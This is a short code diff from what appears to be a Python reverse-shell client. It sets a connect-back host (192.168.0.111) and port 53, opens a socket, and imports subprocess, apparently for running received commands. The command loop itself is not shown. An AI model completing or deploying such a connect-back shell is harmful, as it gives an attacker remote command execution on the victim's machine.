@@ -1,8 +1,8 @@
 import socket
 import subprocess
 
-SERVER_HOST = "0.0.0.0" // Change this
-SERVER_PORT = 6969 	// Change this
+SERVER_HOST = "192.168.0.111" # Change this
+SERVER_PORT = 53 	# Change this
 BUFFER_SIZE = 1024
 
 s = socket.socket()
